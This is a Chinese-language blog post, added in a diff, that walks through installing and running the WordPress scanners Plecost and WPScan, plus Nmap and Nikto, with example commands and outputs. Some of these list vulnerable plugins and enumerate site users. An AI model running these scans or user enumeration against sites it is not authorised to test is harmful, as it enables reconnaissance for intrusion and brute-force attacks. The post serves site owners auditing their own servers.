+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/11/25/%E5%AE%89%E8%A3%85wordpress%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">安装wordpress网站安全检测工具</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-11-25 15:20:02" itemprop="dateCreated datePublished" datetime="2017-11-25T15:20:02+08:00">2017-11-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-11 11:53:06" itemprop="dateModified" datetime="2020-10-11T11:53:06+08:00">2020-10-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Plecost WordPress Fingerprinting Tool:</p>
+<p>Plecost是一款非常棒的wordpress安全检测工具，你可以在backtrack、backbox和blackubuntu中找到它。Plecost包含一个较全面的插件数据库并能检查出wordpress是否存在CVE发布的漏洞。</p>
+<p>Plecost可以在两种模式下运行，一种是通过一个特定URL作为目标，一种是通过google搜索多个结果。我们这里举例的模式是前者，即一个特定的url。</p>
+<p>根据plecost官网的介绍，说得很详细了，我这里粘贴下：</p>
+<h1 id="Plecost"><a href="#Plecost" class="headerlink" title="Plecost"></a>Plecost</h1><p><img src="https://raw.githubusercontent.com/iniqua/plecost/develop/plecost_lib/doc/images/logo_plecost.jpg" alt="Logo"></p>
+<p><em>Plecost: Wordpress vulnerabilities finder</em></p>
+<table>
+<thead>
+<tr>
+<th>Code</th>
+<th><a target="_blank" rel="noopener" href="https://github.com/iniqua/plecost/tree/python3">https://github.com/iniqua/plecost/tree/python3</a></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Issues</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/iniqua/plecost/tree/python3/issues">https://github.com/iniqua/plecost/tree/python3/issues</a></td>
+</tr>
+<tr>
+<td>Python version</td>
+<td>Python 3</td>
+</tr>
+</tbody></table>
+<h2 id="What’s-Plecost"><a href="#What’s-Plecost" class="headerlink" title="What’s Plecost?"></a>What’s Plecost?</h2><p>Plecost is a vulnerability fingerprinting and vulnerability finder for Wordpress blog engine. </p>
+<h2 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h2><p>There are a huge number of Wordpress around the world. Most of them are exposed to be attacked and be converted into a virus, malware or illegal porn provider, without the knowledge of the blog owner.</p>
+<p>This project try to help sysadmins and blog’s owners to make a bit secure their Wordpress.</p>
+<h2 id="What’s-new"><a href="#What’s-new" class="headerlink" title="What’s new?"></a>What’s new?</h2><p>This Plecost 3 version, add a lot of new features and fixes, like:</p>
+<ul>
+<li>Fixed a lot of bugs.</li>
+<li>New engine: without threads or any dependencies, but run more faster. We’ll used python 3 asyncio and non-blocking connections. Also consume less memory. Incredible, right? :) </li>
+<li>Changed CVE update system and storage: Now Plecost get vulnerabilities directly from NIST and create a local SQLite data base with filtered information for Wordpress and theirs plugins.</li>
+<li>Wordpress vulnerabilities: Now Plecost also manage Wordpress Vulnerabilities (not only for the Plugins).</li>
+<li>Add local vulnerability database are queryable. You can consult the vulnerabilities for a concrete wordpress or plugins without, using the local database.</li>
+</ul>
+<p>You can read entire list in CHANGELOG file.</p>
+<h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>Install Plecost is so easy:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m pip install plecost</span><br></pre></td></tr></table></figure>
+
+<p>这里根据我们电脑安装的python而不同，如果我们安装的是python2的话，那么就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -m pip install plecost</span><br></pre></td></tr></table></figure>
+
+<p>如果是在linux上运行的话，可能需要使用sudo</p>
+<p><strong>Remember that Plecost3 only runs in Python 3</strong>. </p>
+<h2 id="Quick-start"><a href="#Quick-start" class="headerlink" title="Quick start"></a>Quick start</h2><p>Scan a web site si so simple:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ plecost http:&#x2F;&#x2F;SITE.com</span><br></pre></td></tr></table></figure>
+
+<p>A bit complex scan: increasing verbosity exporting results in JSON format and XML:</p>
+<p><em>JSON</em></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ plecost -v http:&#x2F;&#x2F;SITE.com -o results.json</span><br></pre></td></tr></table></figure>
+
+<p><em>XML</em></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ plecost -v http:&#x2F;&#x2F;SITE.com -o results.xml</span><br></pre></td></tr></table></figure>
+
+<h2 id="Advanced-scan-options"><a href="#Advanced-scan-options" class="headerlink" title="Advanced scan options"></a>Advanced scan options</h2><p>No check WordPress version, only for plugins:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ plecost -nc http:&#x2F;&#x2F;SITE.com </span><br></pre></td></tr></table></figure>
+
+<p><strong>Force scan</strong>, even if not Wordpress was detected:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ plecost -f http:&#x2F;&#x2F;SITE.com</span><br></pre></td></tr></table></figure>
+
+<p>Display only the short banner:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ plecost -nb http:&#x2F;&#x2F;SITE.com</span><br></pre></td></tr></table></figure>
+
+<p>List available wordlists:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ plecost -nb -l </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Plecost - Wordpress finger printer Tool - v1.0.0</span><br><span class="line"></span><br><span class="line">Available word lists:</span><br><span class="line">   1 - plugin_list_10.txt</span><br><span class="line">   2 - plugin_list_100.txt</span><br><span class="line">   3 - plugin_list_1000.txt</span><br><span class="line">   4 - plugin_list_250.txt</span><br><span class="line">   5 - plugin_list_50.txt</span><br><span class="line">   6 - plugin_list_huge.txt</span><br></pre></td></tr></table></figure>
+
+<p>Select a wordlist in the list:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ plecost -nb -w plugin_list_10.txt http:&#x2F;&#x2F;SITE.com</span><br></pre></td></tr></table></figure>
+
+<p>Increasing concurrency (<strong>USE THIS OPTION WITH CAUTION. CAN SHUTDOWN TESTED SITE!</strong>)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ plecost --concurrency 10 http:&#x2F;&#x2F;SITE.com</span><br></pre></td></tr></table></figure>
+
+<p>Or…</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ plecost -c 10 http:&#x2F;&#x2F;SITE.com</span><br></pre></td></tr></table></figure>
+
+<p><em>For more options, consult the –help command</em>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ plecost -h</span><br></pre></td></tr></table></figure>
+
+<p>接下来我们使用<br>root@bt:/pentest/web/scanners/plecost# ./plecost-0.2.2-9-beta.py -i wp_plugin_list.txt -c <a target="_blank" rel="noopener" href="http://127.0.0.1/wordpress">http://127.0.0.1/wordpress</a> 命令检查目标url并比对是否存在cve漏洞</p>
+<p><img src="https://i.imgur.com/xZvegPr.png"></p>
+<p>可以很直观的看到结果，不少弱点暴露出来了.</p>
+<h2 id="Updating"><a href="#Updating" class="headerlink" title="Updating"></a>Updating</h2><p>New versions and vulnerabilities are released diary, you can upload the local database writing:</p>
+<p>Updating vulnerability database:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ plecost --update-cve</span><br></pre></td></tr></table></figure>
+
+<p>Updating plugin list:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ plecost --update-plugins</span><br></pre></td></tr></table></figure>
+
+<h2 id="Reading-local-vulnerability-database"><a href="#Reading-local-vulnerability-database" class="headerlink" title="Reading local vulnerability database"></a>Reading local vulnerability database</h2><p>Plecost has a local vulnerability database of Wordpress and wordpress plugins. You can consult it in off-line mode.</p>
+<p>Listing all known plugins with vulnerabilities:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ plecost -nb --show-plugins </span><br><span class="line">  </span><br><span class="line">&#x2F;&#x2F; Plecost - Wordpress finger printer Tool - v1.0.0</span><br><span class="line"></span><br><span class="line">[*] Plugins with vulnerabilities known:</span><br><span class="line"></span><br><span class="line">  &#123; 0 &#125; - acobot_live_chat_%26_contact_form</span><br><span class="line">  &#123; 1 &#125; - activehelper_livehelp_live_chat</span><br><span class="line">  &#123; 2 &#125; - ad-manager</span><br><span class="line">  &#123; 3 &#125; - alipay</span><br><span class="line">  &#123; 4 &#125; - all-video-gallery</span><br><span class="line">  &#123; 5 &#125; - all_in_one_wordpress_security_and_firewall</span><br><span class="line">  &#123; 6 &#125; - another_wordpress_classifieds_plugin</span><br><span class="line">  &#123; 7 &#125; - anyfont</span><br><span class="line">  &#123; 8 &#125; - april%27s_super_functions_pack</span><br><span class="line">  &#123; 9 &#125; - banner_effect_header</span><br><span class="line">  &#123; 10 &#125; - bannerman</span><br><span class="line">  &#123; 11 &#125; - bib2html</span><br><span class="line">  &#123; 12 &#125; - bic_media_widget</span><br><span class="line">  &#123; 13 &#125; - bird_feeder</span><br><span class="line">  &#123; 14 &#125; - blogstand-smart-banner</span><br><span class="line">  &#123; 15 &#125; - blue_wrench_video_widget</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">[*] Done!</span><br></pre></td></tr></table></figure>
+
+<p>Show vulnerabilities of a concrete plugin:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ plecost -nb -vp google_analytics</span><br><span class="line">          </span><br><span class="line">&#x2F;&#x2F; Plecost - Wordpress finger printer Tool - v1.0.0</span><br><span class="line"></span><br><span class="line">[*] Associated CVEs for plugin &#39;google_analytics&#39;:</span><br><span class="line"></span><br><span class="line">  &#123; 0 &#125; - CVE-2014-9174:</span><br><span class="line"></span><br><span class="line">           Affected versions:</span><br><span class="line"></span><br><span class="line">           &lt;0&gt; - 5.1.2</span><br><span class="line">           &lt;1&gt; - 5.1.1</span><br><span class="line">           &lt;2&gt; - 5.1</span><br><span class="line">           &lt;3&gt; - 5.1.0</span><br><span class="line"></span><br><span class="line">[*] Done!</span><br></pre></td></tr></table></figure>
+
+<p>Show details of a concrete CVE:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ plecost -nb --cve CVE-2014-9174</span><br><span class="line">          </span><br><span class="line">&#x2F;&#x2F; Plecost - Wordpress finger printer Tool - v1.0.0</span><br><span class="line"></span><br><span class="line">[*] Detail for CVE &#39;CVE-2014-9174&#39;:</span><br><span class="line"></span><br><span class="line">  Cross-site scripting (XSS) vulnerability in the Google Analytics by Yoast (google-analytics-for-wordpress) plugin before 5.1.3 for WordPress allows remote attackers to inject arbitrary web script or HTML via the &quot;Manually enter your UA code&quot; (manual_ua_code_field) field in the General Settings.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Done!</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h2><p>Getting the [100k top WordPress sites (<a target="_blank" rel="noopener" href="http://hackertarget.com/100k-top-wordpress-powered-sites/">http://hackertarget.com/100k-top-wordpress-powered-sites/</a>) and getting aleatory one of them…</p>
+<p><img src="https://raw.githubusercontent.com/iniqua/plecost/python3/plecost_lib/doc/images/running.gif" alt="running"></p>
+<p>And… here more results of Plecost for real sites… :)</p>
+<p><img src="https://raw.githubusercontent.com/iniqua/plecost/python3/plecost_lib/doc/images/scan_example1.png" alt="Example1"><br><img src="https://raw.githubusercontent.com/iniqua/plecost/python3/plecost_lib/doc/images/scan_example2.png" alt="Example2"><br><img src="https://raw.githubusercontent.com/iniqua/plecost/python3/plecost_lib/doc/images/scan_example3.png" alt="Example3"><br><img src="https://raw.githubusercontent.com/iniqua/plecost/python3/plecost_lib/doc/images/scan_example4.png" alt="Example4"><br><img src="https://raw.githubusercontent.com/iniqua/plecost/python3/plecost_lib/doc/images/scan_example5.png" alt="Example5"><br><img src="https://raw.githubusercontent.com/iniqua/plecost/python3/plecost_lib/doc/images/scan_example6.png" alt="Example6"><br><img src="https://raw.githubusercontent.com/iniqua/plecost/python3/plecost_lib/doc/images/scan_example7.png" alt="Example7"></p>
+<h2 id="Where-to-fish"><a href="#Where-to-fish" class="headerlink" title="Where to fish?"></a>Where to fish?</h2><p>Plecost is available on:</p>
+<ul>
+<li>BackTrack 5 <a target="_blank" rel="noopener" href="http://www.backtrack-linux.org/">http://www.backtrack-linux.org/</a></li>
+<li>BackBox <a target="_blank" rel="noopener" href="http://www.backbox.org/">http://www.backbox.org/</a></li>
+</ul>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
+<li><a target="_blank" rel="noopener" href="http://www.securitybydefault.com/2010/03/seguridad-en-wordpress.html">http://www.securitybydefault.com/2010/03/seguridad-en-wordpress.html</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.securitybydefault.com/2011/11/identificacion-de-vulnerabilidades-en.html">http://www.securitybydefault.com/2011/11/identificacion-de-vulnerabilidades-en.html</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.clshack.it/plecost-a-wordpress-penetration-test-for-plugins">http://www.clshack.it/plecost-a-wordpress-penetration-test-for-plugins</a></li>
+<li><a target="_blank" rel="noopener" href="http://securityetalii.wordpress.com/2010/03/06/auditando-wordpress-con-plecost/">http://securityetalii.wordpress.com/2010/03/06/auditando-wordpress-con-plecost/</a></li>
+<li><a target="_blank" rel="noopener" href="http://loginroot.diosdelared.com/?coment=6116">http://loginroot.diosdelared.com/?coment=6116</a></li>
+<li><a target="_blank" rel="noopener" href="http://ayudawordpress.com/securidad-en-wordpress/">http://ayudawordpress.com/securidad-en-wordpress/</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.ehacking.net/2012/05/wordpress-security-vulnerability.html">http://www.ehacking.net/2012/05/wordpress-security-vulnerability.html</a> </li>
+</ul>
+<p>根据官方的介绍，估计已经知道怎么使用这个工具了。</p>
+<h2 id="我们接下来介绍下WPScan怎么安装和使用"><a href="#我们接下来介绍下WPScan怎么安装和使用" class="headerlink" title="我们接下来介绍下WPScan怎么安装和使用"></a>我们接下来介绍下WPScan怎么安装和使用</h2><p>我将介绍 wpscan 的安装过程，以及怎样使用 wpscan 来定位那些已知的会让你的站点变得易受攻击的插件和主题。还有怎样安装和使用一款免费的网络探索和攻击的安全扫描软件 nmap 。最后展示的是使用 nikto 的步骤。</p>
+<p><strong>用 WPScan 测试 WordPress 中易受攻击的插件和主题</strong></p>
+<p>WPScan 是一个 WordPress 黑盒安全扫描软件，用 Ruby 写成，它是专门用来寻找已知的 WordPress 的弱点的。它为安全专家和 WordPress 管理员提供了一条评估他们的 WordPress 站点的途径。它的基于开源代码，在 GPLv3 下发行。</p>
+<p><strong>下载和安装 WPScan</strong></p>
+<p>在我们开始安装之前，很重要的一点是要注意 wpscan 不能在 Windows 下工作，所以你需要使用一台 Linux 或者 OS X 的机器来完成下面的事情。如果你只有 Windows 的系统，拿你可以下载一个 Virtualbox 然后在虚拟机里面安装任何你喜欢的 Linux 发行版本。</p>
+<p>WPScan 的源代码放在 Github 上，所以需要先安装 git（LCTT 译注：其实你也可以直接从 Github 上下载打包的源代码，而不必非得装 git ）。</p>
+<pre><code>sudo apt-get install git</code></pre>
+<p>git 装好了，我们就要安装 wpscan 的依赖包了。</p>
+<p>在下载和启动wpscan脚本之前，我们需要的是先安装wpscan需要的依赖….</p>
+<p>最先安装的应该是ruby，上文说道wpscan是ruby语言写的，那么你的计算机一定要能识别ruby语言才行貌似最新的是2.1版本。</p>
+<pre><code>sudo apt-get install ruby</code></pre>
+<p>然后接着运行以下命令：</p>
+<pre><code>sudo apt-get install libcurl4-gnutls-dev libxml2 libxml2-dev libxslt1-dev ruby-dev</code></pre>
+<p>然后，把wpscan从github上clone下来。</p>
+<pre><code>git clone https://github.com/wpscanteam/wpscan.git</code></pre>
+<p>现在我们可以进入这个新建立的 wpscan 目录，通过 bundler 安装必要的 ruby 包。</p>
+<pre><code>sudo gem install bundler &amp;&amp; bundle install --without test development</code></pre>
+<p>现在wpscan装好了，我们就可以用它来搜索我们WordPress站点潜在的易受攻击的文件。wpcan最重要的方面是它能列出不仅是插件和主题，也能列出用户和缩略图的功能。WPScan 也可以用来暴力破解 WordPress</p>
+<p>有必要的话，可以根据以下信息运行下。</p>
+<p>完成后，我们更新WPScan的话，先进入到wpscan这个目录然后运行：</p>
+<pre><code>ruby wpscan.rb --update</code></pre>
+<p>但是可能，如果提示要ruby2.1.9才能达到运行的标准…..我们要安装2.1.9….，运行</p>
+<pre><code>sudo apt-get install ruby 2.1.9</code></pre>
+<p>既可。</p>
+<p>完成后，查看下ruby版本：</p>
+<pre><code>ruby -v</code></pre>
+<p>然后运行：</p>
+<pre><code>ruby wpscan.rb --update</code></pre>
+<p>在运行wpscan.rb的时候，可能会出现如下的错误：</p>
+<pre><code>cannot load such file — bundler/setup (LoadError)</code></pre>
+<p>也有可能出现如下错误：</p>
+<pre><code>Could not locate Gemfile</code></pre>
+<p>这样的错误，这个时候我们运行下</p>
+<pre><code>bundle install</code></pre>
+<p>安装成功后，再试试。</p>
+<p>最好检查下是否已经安装了bundler，运行如下命令：</p>
+<pre><code>bundle -v</code></pre>
+<p>如果已经安装那么会出现版本信息。类似如下：</p>
+<pre><code>Bundler version 1.3.5</code></pre>
+<p>或者是查看bundler在哪个目录：</p>
+<pre><code>which bundler</code></pre>
+<p>有安装的话，会出现在哪个目录的。</p>
+<p><strong>列举插件</strong></p>
+<p>我们使用WPScan来列出wordpress网站所有插件，只需要加上 “–enumerate p” 参数，就像这样：</p>
+<p>ruby wpscan.rb –url http(s)://<a target="_blank" rel="noopener" href="http://www.yoursiteurl.com/">www.yoursiteurl.com</a> –enumerate p    //根据协议填写地址，有的是https，而有的是http</p>
+<p><strong>或者仅仅列出易受攻击的插件：</strong></p>
+<pre><code>ruby wpscan.rb --url http(s)://www.yoursiteurl.com --enumerate vp</code></pre>
+<p>下面是一些例子：</p>
+<pre><code>| Name: ukiscet
+| Location: http://********.com/wp-content/plugins/akismet/
+| Name: audio-player
+| Location: http://********.com/wp-content/plugins/audio-player/
+|
+| * Title: Audio Player - player.swf playerID Parameter XSS
+| * Reference: http://seclists.org/bugtraq/2013/Feb/35
+| * Reference: http://secunia.com/advisories/52083
+| * Reference: http://osvdb.org/89963
+| * Fixed in: 2.0.4.6
+| Name: bbpress - v2.3.2
+| Location: http://********.com/wp-content/plugins/bbpress/
+| Readme: http://********.com/wp-content/plugins/bbpress/readme.txt
+|
+| * Title: BBPress - Multiple Script Malformed Input Path Disclosure
+| * Reference: http://xforce.iss.net/xforce/xfdb/78244
+| * Reference: http://packetstormsecurity.com/files/116123/
+| * Reference: http://osvdb.org/86399
+| * Reference: http://www.exploit-db.com/exploits/22396/
+|
+| * Title: BBPress - forum.php page Parameter SQL Injection
+| * Reference: http://xforce.iss.net/xforce/xfdb/78244
+| * Reference: http://packetstormsecurity.com/files/116123/
+| * Reference: http://osvdb.org/86400
+| * Reference: http://www.exploit-db.com/exploits/22396/
+| Name: contact
+| Location: http://********.com/wp-content/plugins/contact/</code></pre>
+<p><strong>列举主题</strong></p>
+<p>列举主题和列举插件差不多，只要用”–enumerate t”就可以了。</p>
+<pre><code>ruby wpscan.rb --url http(s)://www.host-name.com --enumerate t</code></pre>
+<p>或者只列出易受攻击的主题：</p>
+<pre><code>ruby wpscan.rb --url http(s)://www.host-name.com --enumerate vt</code></pre>
+<p>例子的输出：</p>
+<pre><code>| Name: path
+| Location: http://********.com/wp-content/themes/path/
+| Style URL: http://********.com/wp-content/themes/path/style.css
+| Description: 
+| Name: pub
+| Location: http://********.com/wp-content/themes/pub/
+| Style URL: http://********.com/wp-content/themes/pub/style.css
+| Description: 
+| Name: rockstar
+| Location: http://********.com/wp-content/themes/rockstar/
+| Style URL: http://********.com/wp-content/themes/rockstar/style.css
+| Description: 
+|
+| * Title: WooThemes WooFramework Remote Unauthenticated Shortcode Execution
+| * Reference: https://gist.github.com/2523147
+| Name: twentyten
+| Location: http://********.com/wp-content/themes/twentyten/
+| Style URL: http://********.com/wp-content/themes/twentyten/style.css
+| Description: </code></pre>
+<p><strong>列举用户</strong></p>
+<p>WPscan 也可以用来列举某个 WordPress 站点的用户和有效的登录记录。攻击者常常这么做——为了获得一个用户清单，好进行暴力破解。</p>
+<pre><code>ruby wpscan.rb --url http(s)://www.host-name.com --enumerate u</code></pre>
+<p><strong>列举 Timthumb 文件</strong></p>
+<p>关于 WPscan ，我要说的最后一个功能是列举 timthub （缩略图）相关的文件。近年来，timthumb 已经成为攻击者眼里的一个常见目标，因为无数的漏洞被找出来并发到论坛上、邮件列表等等地方。用下面的命令可以通过 wpscan 找出易受攻击的 timthub 文件：</p>
+<pre><code>ruby wpscan.rb --url http(s)://www.host-name.com --enumerate tt</code></pre>
+<h2 id="下面我们来介绍下用-Nmap-扫描你-VPS-的开放端口"><a href="#下面我们来介绍下用-Nmap-扫描你-VPS-的开放端口" class="headerlink" title="下面我们来介绍下用 Nmap 扫描你 VPS 的开放端口"></a><strong>下面我们来介绍下用 Nmap 扫描你 VPS 的开放端口</strong></h2><p>Nmap 是一个开源的用于网络探索和安全审查方面的工具。它可以迅速扫描巨大的网络，也可一单机使用。Nmap 用原始 IP 数据包通过不同寻常的方法判断网络里那些主机是正在工作的，那些主机上都提供了什么服务（应用名称和版本），是什么操作系统（以及版本），用的什么类型的防火墙，以及很多其他特征。</p>
+<p><strong>在 Debian 和 Ubuntu 上下载和安装 nmap</strong></p>
+<p>要在基于 Debian 和 Ubuntu 的操作系统上安装 nmap ，运行下面的命令：</p>
+<pre><code>sudo apt-get install nmap</code></pre>
+<p>输出样例</p>
+<pre><code>Reading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  nmap
+0 upgraded, 1 newly installed, 0 to remove and 2 not upgraded.
+Need to get 1,643 kB of archives.
+After this operation, 6,913 kB of additional disk space will be used.
+Get:1 http://mirrors.service.networklayer.com/ubuntu/ precise/main nmap amd64 5.21-1.1ubuntu1 [1,643 kB]
+Fetched 1,643 kB in 0s (16.4 MB/s)
+Selecting previously unselected package nmap.
+(Reading database ... 56834 files and directories currently installed.)
+Unpacking nmap (from .../nmap_5.21-1.1ubuntu1_amd64.deb) ...
+Processing triggers for man-db ...
+Setting up nmap (5.21-1.1ubuntu1) ...</code></pre>
+<p><strong>举个例子</strong></p>
+<p>输出 nmap 的版本：</p>
+<pre><code>nmap -V</code></pre>
+<p>或者</p>
+<pre><code>nmap --version</code></pre>
+<p>输出样例</p>
+<pre><code>Nmap version 5.21 ( http://nmap.org )</code></pre>
+<p><strong>在 Centos 上下载和安装 nmap</strong></p>
+<p>要在基于 RHEL 的 Linux 上面安装 nmap ，输入下面的命令：</p>
+<pre><code>yum install nmap</code></pre>
+<p>输出样例</p>
+<pre><code>Loaded plugins: protectbase, rhnplugin, security
+0 packages excluded due to repository protections
+Setting up Install Process
+Resolving Dependencies
+--&gt; Running transaction check
+---&gt; Package nmap.x86_64 2:5.51-2.el6 will be installed
+--&gt; Finished Dependency Resolution
+Dependencies Resolved
+================================================================================
+ Package    Arch         Version               Repository                  Size
+================================================================================
+Installing:
+ nmap       x86_64       2:5.51-2.el6          rhel-x86_64-server-6       2.8 M
+Transaction Summary
+================================================================================
+Install       1 Package(s)
+Total download size: 2.8 M
+Installed size: 0
+Is this ok [y/N]: y
+Downloading Packages:
+nmap-5.51-2.el6.x86_64.rpm                               | 2.8 MB     00:00
+Running rpm_check_debug
+Running Transaction Test
+Transaction Test Succeeded
+Running Transaction
+  Installing : 2:nmap-5.51-2.el6.x86_64                                     1/1
+  Verifying  : 2:nmap-5.51-2.el6.x86_64                                     1/1
+Installed:
+  nmap.x86_64 2:5.51-2.el6
+Complete!</code></pre>
+<p><strong>举个例子</strong></p>
+<p>输出 nmap 版本号：</p>
+<pre><code>nmap --version</code></pre>
+<p>输出样例</p>
+<pre><code>Nmap version 5.51 ( http://nmap.org )</code></pre>
+<p><strong>用 Nmap 扫描端口</strong></p>
+<p>你可以用 nmap 来获得很多关于你的服务器的信息，它可以让你站在对你的网站不怀好意的人的角度看你自己的网站。</p>
+<p>因此，请仅用它测试你自己的服务器或者在行动之前通知服务器的所有者。</p>
+<p>nmap 的作者提供了一个测试服务器：</p>
+<pre><code>scanme.nmap.org</code></pre>
+<p>有些命令可能会耗时较长：</p>
+<p>要扫描一个 IP 地址或者一个主机名（全称域名），运行：</p>
+<pre><code>nmap 192.168.1.1</code></pre>
+<p>输出样例：</p>
+<p><img src="https://i.imgur.com/SGHWGA7.png"></p>
+<p>扫描以获得主机的操作系统：</p>
+<pre><code>sudo nmap -O 192.168.1.1</code></pre>
+<p>加上“-”或者“/24”来一次性扫描某个范围里面的多个主机：</p>
+<pre><code>sudo nmap -PN xxx.xxx.xxx.xxx-yyy</code></pre>
+<p>扫描某个范围内可用的服务：</p>
+<pre><code>sudo nmap -sP network_address_range</code></pre>
+<p>扫描 IP 地址时部进行反向 DNS 解析。多数情况下这会加快你获得结果的速度：</p>
+<pre><code>sudo nmap -n remote_host</code></pre>
+<p>扫描一个特定端口而不是所有常用端口：</p>
+<pre><code>sudo nmap -p port_number remote_host</code></pre>
+<p>扫描一个网络，找出哪些服务器在线，分别运行了什么服务。</p>
+<p>这就是传说中的主机探索或者 ping 扫描：</p>
+<pre><code>nmap -sP 192.168.1.0/24</code></pre>
+<p>输出样例：</p>
+<pre><code>Host 192.168.1.1 is up (0.00035s latency).
+MAC Address: BC:AE:C5:C3:16:93 (Unknown)
+Host 192.168.1.2 is up (0.0038s latency).
+MAC Address: 74:44:01:40:57:FB (Unknown)
+Host 192.168.1.5 is up.
+Host nas03 (192.168.1.12) is up (0.0091s latency).
+MAC Address: 00:11:32:11:15:FC (Synology Incorporated)
+Nmap done: 256 IP addresses (4 hosts up) scanned in 2.80 second</code></pre>
+<p>理解端口配置和如何发现你的服务器上的攻击目标只是确保你的信息和你的 VPS 安全的第一步。</p>
+<p><strong>用 Nikto 扫描你网站的缺陷</strong></p>
+<p>Nikto 网络扫描器是一个开源的 web 服务器的扫描软件，它可以用来扫描 web 服务器上的恶意的程序和文件。Nikto 也可以用来检查软件版本是否过期。Nikto 能进行简单而快速地扫描以发现服务器上危险的文件和程序。扫描结束后会给出一个日志文件。</p>
+<p><strong>在 Linux 服务器上下载和安装 Nikto</strong></p>
+<p>Perl 在 Linux 上是预先安装好的，所以你只需要从项目页面下载 nikto ，解压到一个目录里面，然后开始测试。</p>
+<pre><code>wget https://cirt.net/nikto/nikto-2.1.4.tar.gz</code></pre>
+<p>你可以用某个归档管理工具解包，或者如下同时使用 tar 和 gzip ：</p>
+<pre><code>tar zxvf nikto-2.1.4.tar.gz
+cd nikto-2.1.4
+perl nikto.pl</code></pre>
+<p>安装正确的话会得到这样的结果：</p>
+<pre><code> - ***** SSL support not available (see docs for SSL install) *****
+- Nikto v2.1.4
+---------------------------------------------------------------------------
++ ERROR: No host specified
